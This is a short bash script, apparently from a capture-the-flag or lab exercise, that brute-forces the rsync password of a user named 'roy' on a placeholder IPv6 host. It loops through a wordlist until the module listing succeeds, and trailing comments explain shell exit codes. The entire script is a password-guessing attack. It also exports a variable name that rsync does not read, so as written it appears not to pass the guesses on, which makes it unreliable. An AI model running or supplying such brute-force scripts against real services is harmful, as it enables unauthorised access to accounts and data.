#!/bin/bash

for pass in $(cat wordlists.txt);
do
   export rsync_pass=$pass
   rsync -q rsync://roy@[ipv6address]:port/home_roy --list-only 2>/dev/null #-q for quite mmode in rsync

   if [[ $? -eq 0 ]] #if the exit code of the last command is =0 then it completed successfully
   then
      echo "Pasword: $pass"
      break
   fi
   echo "Pass : $pass"
done


#----------what are exit codes---------------

#inside terminal do these and $? is exit code
#export rsync_pass= < wrong_password >
#run this command rsync -q rsync://roy@[ipv6address]:port/home_roy --list-only 2>/dev/null
#echo $? --=> 5

#cat <file that exists > 
#echo $? --->0

#cat <file_that_dont_exist>
#echo $? ---> 1 (bcoz the command failed)

#so the exit code gets the value of last command that we ran

